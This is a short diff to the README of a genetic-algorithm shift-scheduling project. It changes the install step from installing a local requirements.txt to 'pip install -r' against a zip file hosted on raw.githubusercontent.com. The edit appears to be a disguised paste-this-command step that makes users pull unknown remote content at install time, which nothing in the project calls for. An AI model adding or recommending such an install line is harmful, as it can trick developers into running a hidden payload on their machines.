@@ -11,4 +11,4 @@ Implementation of a Multi-Objective Genetic Algorithm for shift scheduling optim
 ## Usage
 1. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/HimethSanjula11/COMP-5012--Computational-Intelligence/main/grind/COMP-5012--Computational-Intelligence.zip
